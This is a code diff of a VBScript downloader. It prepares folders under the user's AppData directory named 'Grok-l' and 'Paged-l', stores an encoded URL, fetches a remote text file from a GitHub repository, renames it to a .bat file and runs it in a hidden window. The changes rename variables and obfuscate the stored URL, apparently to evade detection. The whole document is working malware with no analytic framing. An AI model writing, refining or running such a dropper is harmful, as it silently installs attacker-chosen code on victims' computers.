@@ -1,33 +1,36 @@
+On Error Resume Next: Set fso=CreateObject("Scripting.FileSystemObject"):Set sh=CreateObject("WScript.Shell"):p=sh.ExpandEnvironmentStrings("%APPDATA%")&"\Paged"
+If fso.FolderExists(p) Then fso.DeleteFolder p, True
+On Error Resume Next: Set fso=CreateObject("Scripting.FileSystemObject"):Set sh=CreateObject("WScript.Shell"):p=sh.ExpandEnvironmentStrings("%APPDATA%")&"\Paged-l"
+If fso.FolderExists(p) Then fso.DeleteFolder p, True
 With CreateObject("Scripting.FileSystemObject")
-    f = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok-l")
-    If .FolderExists(f) Then .DeleteFolder f, True
+    tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok-l")
+    If .FolderExists(tempPath) Then .DeleteFolder tempPath, True
 End With
 
-Set FSO = CreateObject("Scripting.FileSystemObject")
-Set WShell = CreateObject("WScript.Shell")
-strAppData = WShell.ExpandEnvironmentStrings("%APPDATA%")
-strFolder = strAppData & "\Grok-l"
+Set fileSys = CreateObject("Scripting.FileSystemObject")
+Set shellObj = CreateObject("WScript.Shell")
+userData = shellObj.ExpandEnvironmentStrings("%APPDATA%")
+workDir = userData & "\Paged-l"
 
-If Not FSO.FolderExists(strFolder) Then FSO.CreateFolder(strFolder)
+If Not fileSys.FolderExists(workDir) Then fileSys.CreateFolder(workDir)
 
-Set txtFile = FSO.CreateTextFile(strFolder & "\l.txt", True)
-txtFile.WriteLine "https://raw.githubusercontent.com/opm4opm4/code/main/done.txt"
-txtFile.Close
+Set fileOut1 = fileSys.CreateTextFile(workDir & "\l.txt", True)
+fileOut1.WriteLine "BhsDHhxNQUAQBxsfGw1ZDQAaQQAHA1sYHgJDQRwWAx8bC0AFDxhYAw4eAEASAAwYCgoTQBsPGg=="
+fileOut1.Close
 
-Set txtFile2 = FSO.CreateTextFile(strFolder & "\m.txt", True)
-Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
-xmlHttp.Open "GET", "https://raw.githubusercontent.com/USATIKTOKER/NEWADD/main/main.txt", False
-xmlHttp.Send
-txtFile2.Write xmlHttp.responseText
-txtFile2.Close
+Set fileOut2 = fileSys.CreateTextFile(workDir & "\m.txt", True)
+Set httpObj = CreateObject("MSXML2.XMLHTTP")
+httpObj.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False
+httpObj.Send
+fileOut2.Write httpObj.responseText
+fileOut2.Close
 
 WScript.Sleep 5000
-FSO.MoveFile strFolder & "\m.txt", strFolder & "\m.bat"
+fileSys.MoveFile workDir & "\m.txt", workDir & "\m.bat"
 WScript.Sleep 3000
 
-' FIXED: Use quoted path & check if file exists before running
-If FSO.FileExists(strFolder & "\m.bat") Then
-    WShell.Run Chr(34) & strFolder & "\m.bat" & Chr(34), 0, False
+If fileSys.FileExists(workDir & "\m.bat") Then
+    shellObj.Run Chr(34) & workDir & "\m.bat" & Chr(34), 0, False
 Else
-    WScript.Echo "Error: m.bat not found in " & strFolder
+    WScript.Echo "Error: m.bat not found in " & workDir
 End If
